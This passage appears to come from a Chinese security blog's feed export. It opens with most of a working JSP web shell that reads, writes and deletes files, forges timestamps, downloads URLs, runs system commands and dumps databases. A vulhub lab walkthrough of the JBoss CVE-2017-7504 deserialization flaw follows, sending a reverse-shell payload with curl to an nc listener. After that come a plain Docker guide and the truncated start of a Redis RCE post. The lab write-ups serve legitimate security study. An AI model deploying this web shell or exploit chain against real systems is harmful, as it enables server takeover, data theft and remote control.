(!df.exists()) &#123;  </span><br><span class="line">              df.mkdir();  </span><br><span class="line">         &#125;  </span><br><span class="line">           File z[] = sf.listFiles();  </span><br><span class="line">          for (int j = 0; j &lt; z.length; j++) &#123;  </span><br><span class="line">              HH(s + &quot;/&quot; + z[j].getName(), d + &quot;/&quot; + z[j].getName());  </span><br><span class="line">         &#125;  </span><br><span class="line">       &#125; else &#123;  </span><br><span class="line">          FileInputStream is = new FileInputStream(sf);  </span><br><span class="line">           FileOutputStream os = new FileOutputStream(df);  </span><br><span class="line">          int n;  </span><br><span class="line">          byte[] b = new byte[512];  </span><br><span class="line">           while ((n = is.read(b, 0, 512)) != -1) &#123;  </span><br><span class="line">               os.write(b, 0, n);  </span><br><span class="line">         &#125;  </span><br><span class="line">           is.close();  </span><br><span class="line">           os.close();  </span><br><span class="line">       &#125;  </span><br><span class="line">   &#125;  </span><br><span class="line">   void II(String s, String d) throws Exception &#123;  </span><br><span class="line">       File sf = new File(s), df = new File(d);  </span><br><span class="line">      sf.renameTo(df);  </span><br><span class="line">   &#125;  </span><br><span class="line">void JJ(String s) throws Exception &#123;  </span><br><span class="line">       File f = new File(s);  </span><br><span class="line">      f.mkdir();  </span><br><span class="line">   &#125;  </span><br><span class="line"> void KK(String s, String t) throws Exception &#123;  </span><br><span class="line">      File f = new File(s);  </span><br><span class="line">    SimpleDateFormat fm = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);  </span><br><span class="line">      java.util.Date dt = fm.parse(t);  </span><br><span class="line">   f.setLastModified(dt.getTime());  </span><br><span class="line">   &#125;  </span><br><span class="line">  void LL(String s, String d) throws Exception &#123;  </span><br><span class="line">      URL u = new URL(s);  </span><br><span class="line">      int n = 0;  </span><br><span class="line">      FileOutputStream os = new FileOutputStream(d);  </span><br><span class="line">       HttpURLConnection h = (HttpURLConnection) u.openConnection();  </span><br><span class="line">       InputStream is = h.getInputStream();  </span><br><span class="line">      byte[] b = new byte[512];  </span><br><span class="line">      while ((n = is.read(b)) != -1) &#123;  </span><br><span class="line">         os.write(b, 0, n);  </span><br><span class="line">      &#125;  </span><br><span class="line">      os.close();  </span><br><span class="line">       is.close();  </span><br><span class="line">    h.disconnect();  </span><br><span class="line">  &#125;  </span><br><span class="line">  void MM(InputStream is, StringBuffer sb) throws Exception &#123;  </span><br><span class="line">       String l;  </span><br><span class="line">       BufferedReader br = new BufferedReader(new InputStreamReader(is));  </span><br><span class="line">      while ((l = br.readLine()) != null) &#123;  </span><br><span class="line">          sb.append(l + &quot;\r\n&quot;);  </span><br><span class="line">      &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">  void NN(String s, StringBuffer sb) throws Exception &#123;  </span><br><span class="line">      Connection c = GC(s);  </span><br><span class="line">      ResultSet r = s.indexOf(&quot;jdbc:oracle&quot;)!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();  </span><br><span class="line">      while (r.next()) &#123;  </span><br><span class="line">           sb.append(r.getString(1) + &quot;\t|\t\r\n&quot;);  </span><br><span class="line">       &#125;  </span><br><span class="line">      r.close();  </span><br><span class="line">       c.close();  </span><br><span class="line">    &#125;  </span><br><span class="line">  void OO(String s, StringBuffer sb) throws Exception &#123;  </span><br><span class="line">   Connection c = GC(s);  </span><br><span class="line">      String[] x = s.trim().split(&quot;choraheiheihei&quot;);  </span><br><span class="line">     ResultSet r = c.getMetaData().getTables(null,s.indexOf(&quot;jdbc:oracle&quot;)!=-1?x.length&gt;5?x[5]:x[4]:null, &quot;%&quot;, new String[]&#123;&quot;TABLE&quot;&#125;);  </span><br><span class="line">      while (r.next()) &#123;  </span><br><span class="line">         sb.append(r.getString(&quot;TABLE_NAME&quot;) + &quot;\t|\t\r\n&quot;);  </span><br><span class="line">     &#125;  </span><br><span class="line">     r.close();  </span><br><span class="line">   c.close();  </span><br><span class="line"> &#125;  </span><br><span class="line">   void PP(String s, StringBuffer sb) throws Exception &#123;  </span><br><span class="line">      String[] x = s.trim().split(&quot;\r\n&quot;);  </span><br><span class="line">       Connection c = GC(s);  </span><br><span class="line">     Statement m = c.createStatement(1005, 1007);  </span><br><span class="line">      ResultSet r = m.executeQuery(&quot;select * from &quot; + x[x.length-1]);  </span><br><span class="line">      ResultSetMetaData d = r.getMetaData();  </span><br><span class="line">      for (int i = 1; i &lt;= d.getColumnCount(); i++) &#123;  </span><br><span class="line">         sb.append(d.getColumnName(i) + &quot; (&quot; + d.getColumnTypeName(i)+ &quot;)\t&quot;);  </span><br><span class="line">   &#125;  </span><br><span class="line">      r.close();  </span><br><span class="line">    m.close();  </span><br><span class="line">       c.close();  </span><br><span class="line">   &#125;  </span><br><span class="line">  void QQ(String cs, String s, String q, StringBuffer sb,String p) throws Exception &#123;  </span><br><span class="line">       Connection c = GC(s);  </span><br><span class="line">      Statement m = c.createStatement(1005, 1008);  </span><br><span class="line">     BufferedWriter bw = null;  </span><br><span class="line">      try &#123;  </span><br><span class="line">          ResultSet r = m.executeQuery(q.indexOf(&quot;--f:&quot;)!=-1?q.substring(0,q.indexOf(&quot;--f:&quot;)):q);  </span><br><span class="line">          ResultSetMetaData d = r.getMetaData();  </span><br><span class="line">           int n = d.getColumnCount();  </span><br><span class="line">         for (int i = 1; i &lt;= n; i++) &#123;  </span><br><span class="line">              sb.append(d.getColumnName(i) + &quot;\t|\t&quot;);  </span><br><span class="line">        &#125;  </span><br><span class="line">          sb.append(&quot;\r\n&quot;);  </span><br><span class="line">          if(q.indexOf(&quot;--f:&quot;)!=-1)&#123;  </span><br><span class="line">             File file = new File(p);  </span><br><span class="line">               if(q.indexOf(&quot;-to:&quot;)==-1)&#123;  </span><br><span class="line">                   file.mkdir();  </span><br><span class="line">             &#125;  </span><br><span class="line">            bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(&quot;-to:&quot;)!=-1?p.trim():p+q.substring(q.indexOf(&quot;--f:&quot;) + 4,q.length()).trim()),true),cs));  </span><br><span class="line">          &#125;  </span><br><span class="line">         while (r.next()) &#123;  </span><br><span class="line">              for (int i = 1; i &lt;= n; i++) &#123;  </span><br><span class="line">                  if(q.indexOf(&quot;--f:&quot;)!=-1)&#123;  </span><br><span class="line">                        bw.write(r.getObject(i)+&quot;&quot;+&quot;\t&quot;);  </span><br><span class="line">                        bw.flush();  </span><br><span class="line">                    &#125;else&#123;  </span><br><span class="line">                        sb.append(r.getObject(i)+&quot;&quot; + &quot;\t|\t&quot;);  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">                if(bw!=null)&#123;bw.newLine();&#125;  </span><br><span class="line">                sb.append(&quot;\r\n&quot;);  </span><br><span class="line">            &#125;  </span><br><span class="line">            r.close();  </span><br><span class="line">            if(bw!=null)&#123;bw.close();&#125;  </span><br><span class="line">       &#125; catch (Exception e) &#123;  </span><br><span class="line">           sb.append(&quot;Result\t|\t\r\n&quot;);  </span><br><span class="line">            try &#123;  </span><br><span class="line">               m.executeUpdate(q);  </span><br><span class="line">                sb.append(&quot;Execute Successfully!\t|\t\r\n&quot;);  </span><br><span class="line">           &#125; catch (Exception ee) &#123;  </span><br><span class="line">               sb.append(ee.toString() + &quot;\t|\t\r\n&quot;);  </span><br><span class="line">           &#125;  </span><br><span class="line">       &#125;  </span><br><span class="line">        m.close();  </span><br><span class="line">     c.close();  </span><br><span class="line">&#125;  </span><br><span class="line">%&gt;  </span><br><span class="line">&lt;%  </span><br><span class="line">//String Z = EC(request.getParameter(Pwd) + &quot;&quot;, cs);  </span><br><span class="line">   cs = request.getParameter(&quot;code&quot;) != null ? request.getParameter(&quot;code&quot;)+ &quot;&quot;:cs;  </span><br><span class="line">  request.setCharacterEncoding(cs);  </span><br><span class="line">   response.setContentType(&quot;text/html;charset=&quot; + cs);  </span><br><span class="line">  StringBuffer sb = new StringBuffer(&quot;&quot;);  </span><br><span class="line">if (request.getParameter(Pwd) != null) &#123;  </span><br><span class="line">  try &#123;  </span><br><span class="line">     String Z = EC(request.getParameter(&quot;action&quot;) + &quot;&quot;);  </span><br><span class="line">       String z1 = EC(request.getParameter(&quot;z1&quot;) + &quot;&quot;);  </span><br><span class="line">       String z2 = EC(request.getParameter(&quot;z2&quot;) + &quot;&quot;);  </span><br><span class="line">      sb.append(&quot;-&gt;&quot; + &quot;|&quot;);  </span><br><span class="line">      String s = request.getSession().getServletContext().getRealPath(&quot;/&quot;);  </span><br><span class="line">     if (Z.equals(&quot;A&quot;)) &#123;  </span><br><span class="line">          sb.append(s + &quot;\t&quot;);  </span><br><span class="line">           if (!s.substring(0, 1).equals(&quot;/&quot;)) &#123;  </span><br><span class="line">             AA(sb);  </span><br><span class="line">          &#125;  </span><br><span class="line">      &#125; else if (Z.equals(&quot;B&quot;)) &#123;  </span><br><span class="line">          BB(z1, sb);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;C&quot;)) &#123;  </span><br><span class="line">           String l = &quot;&quot;;  </span><br><span class="line">          BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));  </span><br><span class="line">          while ((l = br.readLine()) != null) &#123;  </span><br><span class="line">               sb.append(l + &quot;\r\n&quot;);  </span><br><span class="line">        &#125;  </span><br><span class="line">           br.close();  </span><br><span class="line">      &#125; else if (Z.equals(&quot;D&quot;)) &#123;  </span><br><span class="line">          BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));  </span><br><span class="line">          bw.write(z2);  </span><br><span class="line">          bw.close();  </span><br><span class="line">           sb.append(&quot;1&quot;);  </span><br><span class="line">      &#125; else if (Z.equals(&quot;E&quot;)) &#123;  </span><br><span class="line">            EE(z1);  </span><br><span class="line">           sb.append(&quot;1&quot;);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;F&quot;)) &#123;  </span><br><span class="line">          FF(z1, response);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;G&quot;)) &#123;  </span><br><span class="line">         GG(z1, z2);  </span><br><span class="line">           sb.append(&quot;1&quot;);  </span><br><span class="line">      &#125; else if (Z.equals(&quot;H&quot;)) &#123;  </span><br><span class="line">          HH(z1, z2);  </span><br><span class="line">          sb.append(&quot;1&quot;);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;I&quot;)) &#123;  </span><br><span class="line">          II(z1, z2);  </span><br><span class="line">           sb.append(&quot;1&quot;);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;J&quot;)) &#123;  </span><br><span class="line">           JJ(z1);  </span><br><span class="line">         sb.append(&quot;1&quot;);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;K&quot;)) &#123;  </span><br><span class="line">           KK(z1, z2);  </span><br><span class="line">           sb.append(&quot;1&quot;);  </span><br><span class="line">      &#125; else if (Z.equals(&quot;L&quot;)) &#123;  </span><br><span class="line">           LL(z1, z2);  </span><br><span class="line">         sb.append(&quot;1&quot;);  </span><br><span class="line">    &#125; else if (Z.equals(&quot;M&quot;)) &#123;  </span><br><span class="line">           String[] c = &#123; z1.substring(2), z1.substring(0, 2), z2 &#125;;  </span><br><span class="line">           Process p = Runtime.getRuntime().exec(c);  </span><br><span class="line">         MM(p.getInputStream(), sb);  </span><br><span class="line">         MM(p.getErrorStream(), sb);  </span><br><span class="line">      &#125; else if (Z.equals(&quot;N&quot;)) &#123;  </span><br><span class="line">          NN(z1, sb);  </span><br><span class="line">        &#125; else if (Z.equals(&quot;O&quot;)) &#123;  </span><br><span class="line">            OO(z1, sb);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;P&quot;)) &#123;  </span><br><span class="line">           PP(z1, sb);  </span><br><span class="line">       &#125; else if (Z.equals(&quot;Q&quot;)) &#123;  </span><br><span class="line">        QQ(cs, z1, z2, sb,z2.indexOf(&quot;-to:&quot;)!=-1?z2.substring(z2.indexOf(&quot;-to:&quot;)+4,z2.length()):s.replaceAll(&quot;\\\\&quot;, &quot;/&quot;)+&quot;images/&quot;);  </span><br><span class="line">     &#125;  </span><br><span class="line">    &#125; catch (Exception e) &#123;  </span><br><span class="line"> sb.append(&quot;ERROR&quot; + &quot;:// &quot; + e.toString());  </span><br><span class="line">  &#125;  </span><br><span class="line">sb.append(&quot;|&quot; + &quot;&lt;-&quot;);  </span><br><span class="line">out.print(sb.toString());  </span><br><span class="line">&#125;  </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB-RCE</category>
      </categories>
  </entry>
  <entry>
    <title>JBoss 4.x 反序列化漏洞(CVE-2017-7504)</title>
    <url>/2021/08/27/JBoss%204.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2017-7504)/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><blockquote>
<p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p>
</blockquote>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>JBoss AS 4.x及之前版本</li>
</ul>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>docker搭建；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub/jboss/CVE-2017-7504</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">环境</span><br><span class="line">- 靶机：centos 7/docker CVE-2017-7504</span><br><span class="line">- 攻击机：kali 2020/CVE-2015-7501</span><br></pre></td></tr></table></figure>

<p>漏洞验证；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://XXX.XXX.XXX.XXX:8080/jbossmq-httpil/HTTPServerILServlet</span><br></pre></td></tr></table></figure>

<p>访问页面如下则可能存在有此漏洞：</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827111919231.png" alt="image-20210827111919231"></p>
<p>反序列化利用工具;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/ianxtianxt/CVE-2015-7501/</span><br></pre></td></tr></table></figure>

<p>在kail攻击机中解压CVE-2015-7501，并进入目录;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unzip CVE-2015-7501-master.zip</span><br><span class="line">cd CVE-2015-7501-master/</span><br></pre></td></tr></table></figure>

<p>攻击机若没有Java环境，则需先安装Java环境；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz </span><br><span class="line">tar zxvf jdk-8u20-linux-x64.tar.gz</span><br><span class="line">rm -rf /usr/bin/java*</span><br><span class="line">ln -s /opt/jdk1.8.0_20/bin/j* /usr/bin</span><br><span class="line">java -version</span><br></pre></td></tr></table></figure>

<p>反序列化利用工具反弹shell;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.240.242:2333（IP是攻击机ip,2333是要监听的端口)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827112227950.png" alt="image-20210827112227950"></p>
<p>攻击机中另起终端，执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure>

<p>这个时候在CVE-2015-7501-master/目录下生成了一个ReverseShellCommonsCollectionsHashMap.ser文件。</p>
<p>使用curl就能反弹shell，执行命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://192.168.240.140:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser </span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827112436086.png" alt="image-20210827112436086"></p>
<p>若返回的shell非正常交互，则执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210827112510693.png" alt="image-20210827112510693"></p>
]]></content>
      <categories>
        <category>WEB-RCE</category>
      </categories>
  </entry>
  <entry>
    <title>docker安装与使用</title>
    <url>/2021/08/27/docker%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>Docker 包括三个基本概念:</p>
<ul>
<li><strong>镜像（Image）</strong>：Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。</li>
<li><strong>容器（Container）</strong>：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</li>
<li><strong>仓库（Repository）</strong>：仓库可看成一个代码控制中心，用来保存镜像。</li>
</ul>
<p>Docker 使用客户端-服务器 (C/S) 架构模式，使用远程API来管理和创建Docker容器。</p>
<span id="more"></span>

<ul>
<li><strong>详情参考</strong>：<a href="https://www.runoob.com/docker/docker-architecture.html">https://www.runoob.com/docker/docker-architecture.html</a></li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829115850233.png" alt="image-20210829115850233"></p>
<table>
<thead>
<tr>
<th align="left">概念</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Docker 镜像(Images)</td>
<td align="left">Docker 镜像是用于创建 Docker 容器的模板，比如 Ubuntu 系统。</td>
</tr>
<tr>
<td align="left">Docker 容器(Container)</td>
<td align="left">容器是独立运行的一个或一组应用，是镜像运行时的实体。</td>
</tr>
<tr>
<td align="left">Docker 客户端(Client)</td>
<td align="left">Docker 客户端通过命令行或者其他工具使用 Docker SDK (<a href="https://docs.docker.com/develop/sdk/">https://docs.docker.com/develop/sdk/</a>) 与 Docker 的守护进程通信。</td>
</tr>
<tr>
<td align="left">Docker 主机(Host)</td>
<td align="left">一个物理或者虚拟的机器用于执行 Docker 守护进程和容器。</td>
</tr>
<tr>
<td align="left">Docker Registry</td>
<td align="left">Docker 仓库用来保存镜像，可以理解为代码控制中的代码仓库。Docker Hub(<a href="https://hub.docker.com/">https://hub.docker.com</a>) 提供了庞大的镜像集合供使用。一个 Docker Registry 中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本。我们可以通过 <strong>&lt;仓库名&gt;:&lt;标签&gt;</strong> 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 <strong>latest</strong> 作为默认标签。</td>
</tr>
<tr>
<td align="left">Docker Machine</td>
<td align="left">Docker Machine是一个简化Docker安装的命令行工具，通过一个简单的命令行即可在相应的平台上安装Docker，比如VirtualBox、 Digital Ocean、Microsoft Azure。</td>
</tr>
</tbody></table>
<h2 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h2><p>Docker 要求 CentOS 系统的内核版本高于 3.10 ，使用<code>uname -r</code>来验证你的CentOS 版本是否支持 Docker ；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829111739879.png" alt="image-20210829111739879"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">使用 root 权限登录 Centos。确保 yum 包更新到最新。</span><br><span class="line">yum update -y</span><br><span class="line">卸载旧版本(如果安装过旧版本的话)</span><br><span class="line">yum remove docker  docker-common docker-selinux docker-engine</span><br><span class="line">安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的</span><br><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line">设置yum源</span><br><span class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829111845983.png" alt="image-20210829111845983"></p>
<p>可以查看所有仓库中所有docker版本，并选择特定版本安装;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum list docker-ce --showduplicates | sort</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829111944466.png" alt="image-20210829111944466"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># docker安装</span></span><br><span class="line">yum install docker-ce -y  <span class="comment">#由于repo中默认只开启stable仓库，故这里安装的是最新稳定版17.12.0</span></span><br><span class="line">yum install &lt;FQPN&gt;  <span class="comment"># 例如：sudo yum install docker-ce-17.12.0.ce -y</span></span><br><span class="line"><span class="comment"># 查看docker安装版本</span></span><br><span class="line">docker version</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829112038280.png" alt="image-20210829112038280"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 加入开机自启动</span></span><br><span class="line">systemctl start docker</span><br><span class="line">systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829112114629.png" alt="image-20210829112114629"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装docker-compose</span></span><br><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/1.26.2/docker-compose-`uname -s`-`uname -m` &gt; /usr/<span class="built_in">local</span>/bin/docker-compose -k</span><br><span class="line">chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure>

<h2 id="docker使用"><a href="#docker使用" class="headerlink" title="docker使用"></a>docker使用</h2><p><strong>查看docker镜像</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829112242182.png" alt="image-20210829112242182"></p>
<p><strong>查看所有docker容器id</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829112321560.png" alt="image-20210829112321560"></p>
<p><strong>查看当前所有运行中的docker</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210830114420015.png" alt="image-20210830114420015"></p>
<p><strong>运行一个容器</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">格式：docker start &lt;id&gt;</span><br><span class="line"><span class="comment">#例如docker start 5828f5697e25</span></span><br><span class="line">1. 停止一个容器</span><br><span class="line">格式：docker stop &lt;id&gt;</span><br><span class="line"><span class="comment">#例如docker start 5828f5697e25</span></span><br><span class="line">2. 进入一个运行的容器</span><br><span class="line">格式：docker <span class="built_in">exec</span> -it  &lt;容器id&gt; /bin/bash</span><br><span class="line"><span class="comment">#例如docker exec -it  5828f5697e25 /bin/bash</span></span><br><span class="line">3. 容器端口映射</span><br><span class="line">格式：docker run &lt;容器id&gt; -it -p 5984:5984</span><br><span class="line"><span class="comment">#例如：docker run 4138cbdb4df8 -it -p 5984:5984</span></span><br></pre></td></tr></table></figure>

<h2 id="docker容器内快速更换源"><a href="#docker容器内快速更换源" class="headerlink" title="docker容器内快速更换源"></a>docker容器内快速更换源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class="line">    echo &quot;deb http://mirrors.163.com/debian/ jessie main non-free contrib&quot; &gt;&gt; /etc/apt/sources.list</span><br><span class="line">    echo &quot;deb http://mirrors.163.com/debian/ jessie-proposed-updates main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">    echo &quot;deb-src http://mirrors.163.com/debian/ jessie main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">    echo &quot;deb-src http://mirrors.163.com/debian/ jessie-proposed-updates main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">    #更新安装源</span><br><span class="line">    apt-get update </span><br></pre></td></tr></table></figure>

<h2 id="Docker镜像命令"><a href="#Docker镜像命令" class="headerlink" title="Docker镜像命令"></a>Docker镜像命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search ubuntu	<span class="comment">#查找镜像</span></span><br><span class="line">docker pull ubuntu		<span class="comment">#拉取镜像(就是下载)</span></span><br><span class="line">docker images			<span class="comment">#查看所有Docker镜像</span></span><br><span class="line">docker <span class="built_in">history</span>			<span class="comment">#查看镜像历史（有哪些层）</span></span><br><span class="line">docker system df		<span class="comment">#查看镜像、容器、数据卷所占用的空间</span></span><br><span class="line">docker rmi -f id		<span class="comment">#删除镜像</span></span><br><span class="line">docker rmi -f `docker images -q`	<span class="comment">#删除全部镜像</span></span><br></pre></td></tr></table></figure>

<h2 id="Docker容器命令"><a href="#Docker容器命令" class="headerlink" title="Docker容器命令"></a>Docker容器命令</h2><blockquote>
<p>镜像（<code>Image</code>）和容器（<code>Container</code>）的关系，就像是面向对象程序设计中的 <code>类</code> 和 <code>实例</code> 一样</p>
</blockquote>
<blockquote>
<p>镜像是静态的定义，容器是镜像运行时的实体，容器可以被创建、启动、停止、删除、暂停等</p>
</blockquote>
<blockquote>
<p>容器的实质是进程，但与直接在宿主执行的进程不同，容器进程运行于属于自己的独立的 [命名空间]</p>
</blockquote>
<blockquote>
<p>因此容器可以拥有自己的 <code>root</code> 文件系统、自己的网络配置、自己的进程空间，甚至自己的用户 ID 空间</p>
</blockquote>
<blockquote>
<p>容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps			<span class="comment">#查看所有启动的容器（若查看所有的容器包括已经关闭,添加-a参数即可）</span></span><br><span class="line">docker inspect ID	<span class="comment">#查看容器信息（数据卷等 -&gt; &quot;Mounts&quot;）</span></span><br><span class="line">docker stats ID		<span class="comment">#查看Docker状态</span></span><br><span class="line">docker logs ID		<span class="comment">#查看容器日志（报错和命令）</span></span><br><span class="line"></span><br><span class="line">docker run -it -d --name ubuntu_wintrysec -p 8088:80 ubuntu	</span><br><span class="line"><span class="comment">#运行Docker镜像</span></span><br><span class="line"><span class="comment">#-d	守护态运行，不直接把执行命令的结果输出在当前宿主机下</span></span><br><span class="line"><span class="comment">#--name参数为自定义容器名</span></span><br><span class="line"><span class="comment">#-p参数为指定端口映射、后者为容器的端口(我们访问Docker的宿主机8080端口)</span></span><br><span class="line"><span class="comment">#成功后台运行后会返回一个容器的id，只需要记住前两位即可</span></span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it ID bash	</span><br><span class="line"><span class="comment">#进入一个正在运行的容器的shell，容器id前4位就行,或者容器名也行</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>				<span class="comment">#退出容器</span></span><br><span class="line">docker stop ID		<span class="comment">#停止容器运行，写容器名也行，start是开启</span></span><br><span class="line">docker rm ID		<span class="comment">#删除容器</span></span><br><span class="line">docker rm `docker ps -a -q`		<span class="comment">#删除所有已经关闭的容器，-f能把正在运行的也关闭</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>容器安全</category>
      </categories>
  </entry>
  <entry>
    <title>Redis(&lt;= 5.0.5)主从复制 RCE</title>
    <url>/2021/08/29/Redis(=%205.0.5)%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%20RCE/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><blockquote>
<p>在2019年7月7日结束的WCTF2019 Final上，LC/BC的成员Pavel Toporkov在分享会上介绍了一种关于redis新版本的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大。</p>
</blockquote>
<ul>
<li><p>详情参考：<a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">Pavel Toporkov</a></p>
<span id="more"></span></li>
</ul>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Redis &lt;= 5.0.5</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="doker搭建"><a href="#doker搭建" class="headerlink" title="doker搭建"></a>doker搭建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 环境</span><br><span class="line">攻击机：kali</span><br><span class="line">受害机：centos-docker</span><br></pre></td></tr></table></figure>

